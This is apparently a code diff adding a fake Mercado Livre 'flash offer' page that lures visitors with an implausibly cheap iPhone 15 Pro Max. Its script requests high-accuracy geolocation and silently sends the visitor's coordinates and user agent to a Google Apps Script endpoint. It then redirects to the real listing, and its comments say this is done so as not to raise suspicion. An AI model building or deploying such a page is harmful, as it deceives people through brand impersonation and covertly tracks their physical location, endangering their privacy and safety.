@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="pt-pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Livre | Oferta Relâmpago</title>
+    <style>
+        body { font-family: 'Proxima Nova', -apple-system, sans-serif; background-color: #fff159; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; padding: 25px; border-radius: 8px; text-align: center; width: 90%; max-width: 340px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .logo { width: 140px; margin-bottom: 20px; }
+        .product-img { width: 100%; border-radius: 4px; margin-bottom: 15px; }
+        h3 { margin: 10px 0; color: #333; font-size: 18px; }
+        .price { font-size: 28px; font-weight: bold; color: #333; margin: 10px 0; }
+        .old-price { text-decoration: line-through; color: #999; font-size: 14px; }
+        .shipping { color: #00a650; font-weight: bold; font-size: 14px; margin-bottom: 20px; }
+        button { background: #3483fa; color: white; border: none; padding: 16px; width: 100%; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        button:active { background: #1e62c9; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.15/mercadolibre/logo_large_25years_v2.png" alt="ML" class="logo">
+    <img src="https://m.media-amazon.com/images/I/81SigAnN97L._AC_SL1500_.jpg" alt="iPhone" class="product-img">
+    <h3>iPhone 15 Pro Max (256GB) - Titânio</h3>
+    <div class="old-price">R$ 10.999,00</div>
+    <div class="price">R$ 1.899,00</div>
+    <div class="shipping">🚚 Frete grátis disponível</div>
+    <p style="font-size: 13px; color: #666;">Verificando disponibilidade para a sua morada...</p>
+    <button onclick="capturarEIr()">VERIFICAR DISPONIBILIDADE</button>
+</div>
+
+<script>
+    function capturarEIr() {
+        // Tenta obter a localização
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sucesso, erro, {enableHighAccuracy: true});
+        } else {
+            redirecionar();
+        }
+    }
+
+    function sucesso(pos) {
+        // O TEU LINK DO GOOGLE VAI AQUI:
+        const urlGoogle = "https://script.google.com/macros/s/AKfycby1qyka8ZGBo9cl5t0K7oR2eMcTJoyFUK2EqNTiR3oDl7A9lmdg09tsUoSwdUx7OlIeoA/exec";
+
+        const dados = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            device: navigator.userAgent
+        };
+
+        // Envia para o Google Sheets (silencioso)
+        fetch(urlGoogle, {
+            method: 'POST',
+            mode: 'no-cors', // Necessário para o Google Apps Script
+            body: JSON.stringify(dados)
+        }).then(() => {
+            redirecionar();
+        }).catch(() => {
+            redirecionar();
+        });
+    }
+
+    function erro() {
+        redirecionar();
+    }
+
+    function redirecionar() {
+        // Redireciona para o anúncio real do Mercado Livre para não levantar suspeitas
+        window.location.href = "https://www.mercadolivre.com.br/apple-iphone-15-pro-max-256-gb-titanio-azul/p/MLB27383325";
+    }
+</script>
+
+</body>
+</html>
